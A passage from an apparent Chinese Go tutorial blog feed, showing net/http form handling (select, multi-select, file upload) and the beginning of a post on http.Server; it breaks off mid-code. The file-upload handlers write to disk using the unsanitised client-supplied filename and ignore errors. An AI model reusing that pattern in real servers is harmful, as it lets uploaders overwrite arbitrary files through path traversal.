punctuation">)</span> <span class="token comment" spellcheck="true">//"Mikasa"。只会返回第一个值</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"wife"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"Mikasa"。只会返回第一个值</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span></code></pre></li></ul><h5 id="单选下拉列表：-lt-select-gt-lt-select-gt"><a href="#单选下拉列表：-lt-select-gt-lt-select-gt" class="headerlink" title="单选下拉列表：&lt;select&gt;&lt;/select&gt;"></a>单选下拉列表：<code>&lt;select&gt;&lt;/select&gt;</code></h5><ul><li><p>前端代码：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- home.tmpl --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            Rank：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>qt<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>青铜<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>by<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>白银<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hj<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>黄金<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bj<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>铂金<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p>服务器代码</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//map[rank:[hj]]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"rank"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"hj"</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"rank"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"hj"</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">...</span><span class="token operator">...</span></code></pre></li></ul><h5 id="多选下拉列表：-lt-select-multiple-true-gt-lt-select-gt"><a href="#多选下拉列表：-lt-select-multiple-true-gt-lt-select-gt" class="headerlink" title="多选下拉列表：&lt;select multiple=true&gt;&lt;/select&gt;"></a>多选下拉列表：<code>&lt;select multiple=true&gt;&lt;/select&gt;</code></h5><ul><li><p>前端代码：</p><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- home.tmpl --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Home Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            Game：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>game<span class="token punctuation">"</span></span> <span class="token attr-name">multiple</span><span class="token attr-value"><span class="token punctuation">=</span>true</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zelda<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>塞尔达传说：旷野之息<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sekiro<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>只狼：影逝二度<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>nier<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>尼尔：机械纪元<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>csgo<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>反恐精英：全球防御<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span>                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></li><li><p>服务器代码：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span><span class="token function">ParseForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">//map[game:[zelda sekiro nier csgo]]</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>PostForm<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"game"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"zelda"。只返回第一个值。</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">PostFormValue</span><span class="token punctuation">(</span><span class="token string">"game"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//"zelda"。只返回第一个值。</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h5 id="文件上传：-lt-input-type-quot-file-quot-gt"><a href="#文件上传：-lt-input-type-quot-file-quot-gt" class="headerlink" title="文件上传：&lt;input type=&quot;file&quot; /&gt;"></a>文件上传：<code>&lt;input type=&quot;file&quot; /&gt;</code></h5><ul><li><p>前端代码</p><pre class=" language-go"><code class="language-go"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> home<span class="token punctuation">.</span>tmpl <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>html<span class="token operator">></span>    <span class="token operator">&lt;</span>head<span class="token operator">></span>        <span class="token operator">&lt;</span>title<span class="token operator">></span>Home Page<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>body<span class="token operator">></span>        <span class="token operator">&lt;</span>form action<span class="token operator">=</span><span class="token string">"/home"</span> method<span class="token operator">=</span><span class="token string">"post"</span> enctype<span class="token operator">=</span><span class="token string">"multipart/form-data"</span><span class="token operator">></span>            头像：<span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">"file"</span> name<span class="token operator">=</span><span class="token string">"avatar"</span><span class="token operator">></span>                  <span class="token operator">&lt;</span>input <span class="token keyword">type</span><span class="token operator">=</span><span class="token string">"submit"</span>  value<span class="token operator">=</span><span class="token string">"Submit"</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre></li><li><p>服务器代码1：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span><span class="token function">ParseMultipartForm</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//传入的数值表示最大允许保存在内存的字节数，其它剩余部分会被保存到临时文件中。</span>        fh <span class="token operator">:=</span> r<span class="token punctuation">.</span>MultipartForm<span class="token punctuation">.</span>File<span class="token punctuation">[</span><span class="token string">"avatar"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">//得到*multipart.FileHeader</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fh<span class="token punctuation">.</span>Filename<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">//文件名。</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fh<span class="token punctuation">.</span>Size<span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">//文件大小，byte</span>        f<span class="token punctuation">,</span> err <span class="token operator">:=</span> fh<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//FileHeader调用Open()方法，可以得到文件句柄。</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        wf<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>fh<span class="token punctuation">.</span>Filename<span class="token punctuation">)</span>        io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>wf<span class="token punctuation">,</span> f<span class="token punctuation">)</span>        f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        wf<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>服务器代码2：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">home</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>Method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//实际上，与代码1本质是一样的，只不过FormFile()方法内部帮我们调用了FileHeader.Open()</span>        f<span class="token punctuation">,</span> fh<span class="token punctuation">,</span> err <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">FormFile</span><span class="token punctuation">(</span><span class="token string">"avatar"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>            log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fh<span class="token punctuation">.</span>Filename<span class="token punctuation">)</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>fh<span class="token punctuation">.</span>Size<span class="token punctuation">)</span>        wf<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>fh<span class="token punctuation">.</span>Filename<span class="token punctuation">)</span>        io<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>wf<span class="token punctuation">,</span> f<span class="token punctuation">)</span>        f<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        wf<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">,</span> err <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"./home.tmpl"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        log<span class="token punctuation">.</span><span class="token function">Fatalln</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> net/http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go Package-http_server</title>
      <link href="2020/11/05/Go-Package-http-server/"/>
      <url>2020/11/05/Go-Package-http-server/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简单例子"><a href="#一、简单例子" class="headerlink" title="一、简单例子"></a>一、简单例子</h2><ul><li><p><strong>例子一：</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"net/http"</span><span class="token keyword">func</span> <span class="token function">HelloHandler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"Hello Go!!!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> HelloHandler<span class="token punctuation">)</span>    http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8000"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p><strong>例子二：</strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token keyword">type</span> HelloHandle <span class="token keyword">struct</span> <span class="token punctuation">{</span>    content <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>h HelloHandle<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Fprintf</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>HelloHandle<span class="token punctuation">{</span>content<span class="token punctuation">:</span> <span class="token string">"Hello Go"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8000"</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul><h2 id="二、Server"><a href="#二、Server" class="headerlink" title="二、Server"></a>二、Server</h2><p><strong><code>Handler</code>用于处理请求，一个URL使用一个<code>Handler</code>进行处理。</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// A Handler responds to an HTTP request.</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">// ServeHTTP should write reply headers and data to the ResponseWriter and then return. </span><span class="token keyword">type</span> Handler <span class="token keyword">interface</span> <span class="token punctuation">{</span>    <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>ResponseWriter<span class="token punctuation">,</span> <span class="token operator">*</span>Request<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p><strong>使用<code>Server</code>结构体来表示HTTP服务器。</strong></p><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">// A Server defines parameters for running an HTTP server.</span><span class="token keyword">type</span> Server <span class="token keyword">struct</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// Addr optionally specifies the TCP address for the server to listen on,</span>    <span class="token comment" spellcheck="true">// in the form "host:port". If empty, ":http" (port 80) is used.</span>    Addr <span class="token builtin">string</span>    Handler Handler <span class="token comment" spellcheck="true">// handler to invoke, http.DefaultServeMux if nil</span>    <span class="token comment" spellcheck="true">// TLSConfig optionally provides a TLS configuration for use by ServeTLS and ListenAndServeTLS. </span>    TLSConfig <span class="token operator">*</span>tls<span class="token punctuation">.</span>Config    ReadTimeout time<span class="token punctuation">.</span>Duration    ReadHeaderTimeout time<span class="token punctuation">.</span>Duration    WriteTimeout time<span class="token punctuation">.</span>Duration    IdleTimeout time<span class="token punctuation">.</span>Duration    MaxHeaderBytes <span class="token builtin">int</span>    TLSNextProto <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="token operator">*</span>Server<span class="token punctuation">,</span> <span class="token operator">*</span>tls<span class="token punctuation">.</span>Conn<span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>    ConnState <span class="token keyword">func</span><span class="token punctuation">(</span>net<span class="token punctuation">.</span>Conn<span class="token punctuation">,</span> ConnState<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// ErrorLog specifies an optional logger for errors accepting</span>    <span class="token comment" spellcheck="true">// connections, unexpected behavior from handlers, and underlying FileSystem errors.</span>    <span class="token comment" spellcheck="true">// If nil, logging is done via the log package's standard logger.</span>    ErrorLog <span class="token operator">*</span>log<span class="token punctuation">.</span>Logger    BaseContext <span class="token keyword">func</span><span class="token punctuation">(</span>net<span class="token punctuation">.</span>Listener<span class="token punctuation">)</span> context<span class="token punctuation">.</span>Context    ConnContext <span class="token keyword">func</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> c net<span class="token punctuation">.</span>Conn<span class="token punctuation">)</span> context<span class="token punctuation">.</span>Context    disableKeepAlives <span class="token builtin">int32</span>     <span class="token comment" spellcheck="true">// accessed atomically.</span>    inShutdown        <span class="token builtin">int32</span>     <span class="token comment" spellcheck="true">// accessed atomically (non-zero means we're in Shutdown)</span>    nextProtoOnce     sync<span class="token punctuation">.</span>Once <span class="token comment" spellcheck="true">// guards setupHTTP2_* init</span>    nextProtoErr      <span class="token builtin">error</span>     <span class="token comment" spellcheck="true">// result of http2.ConfigureServer if used</span>    mu         sync<span class="token punctuation">.</span>Mutex    listeners  <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token operator">*</span>net<span class="token punctuation">.</span>Listener<span class="token punctuation">]</span><span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    activeConn <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token operator">*</span>conn<span class="token punctuation">]</span><span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    doneChan   <span class="token keyword">chan</span> <span class="token keyword">struct</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    onShutdown <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li><p><strong><code>ListenAndServe()</code></strong></p><ul><li><p>该函数会自动创建一个<code>Server</code>并监听处理请求。</p></li><li><p><code>addr</code>和<code>handler</code>不传入实际值时（传入<code>nil</code>），会使用默认值：</p><ul><li><p><code>addr</code>默认使用<code>0.0.0.0:80</code>。</p></li><li><p><code>handler</code>默认使用<code>DefaultServeMux</code>。</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">ListenAndServe</span><span class="token punctuation">(</span>addr <span class="token builtin">string</span><span class="token punctuation">,</span> handler Handler<span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">{</span>  server <span class="token operator">:=</span> <span class="token operator">&amp;</span>Server<span class="token punctuation">{</span>Addr<span class="token punctuation">:</span> addr<span class="token punctuation">,</span> Handler<span class="token punctuation">:</span> handler<span class="token punctuation">}</span>  <span class="token keyword">return</span> server<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li></ul><ul><li><p><strong><code>*Server.ListenAndServe()</code></strong></p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>srv <span class="token operator">*</span>Server<span class="token punctuation">)</span> <span class="token function">ListenAndServe</span><span class="token 